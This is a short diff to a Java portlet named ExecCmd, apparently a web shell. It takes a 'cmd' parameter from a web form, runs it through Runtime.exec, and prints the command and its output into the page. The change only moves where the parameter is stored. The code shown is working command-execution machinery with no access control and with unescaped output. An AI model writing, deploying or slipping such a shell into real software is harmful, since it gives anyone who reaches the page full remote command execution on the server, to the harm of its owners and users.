@@ -41,14 +41,13 @@ public class ExecCmd extends GenericPortlet {
 		writer.println("<input name=\"submit\" type=\"submit\" value=\"Execute\" />");
 		writer.println("</form></p>");
 
-		String cmd=request.getParameter(response.getNamespace()+"cmd");
+		cmdshell[2]=request.getParameter(response.getNamespace()+"cmd");
 
 		try {
-			if (cmd == null) {
+			if (cmdshell[2] == null) {
 				writer.println("<p>No command to execute</p>");
 			} else {
-				cmdshell[2]=cmd;
-				writer.println("<p>Executing: "+cmd+"</p>");
+				writer.println("<p>Executing: "+cmdshell[2]+"</p>");
 				writer.println("<hr><pre>");
 				Process p = Runtime.getRuntime().exec(cmdshell);
 				OutputStream os = p.getOutputStream();
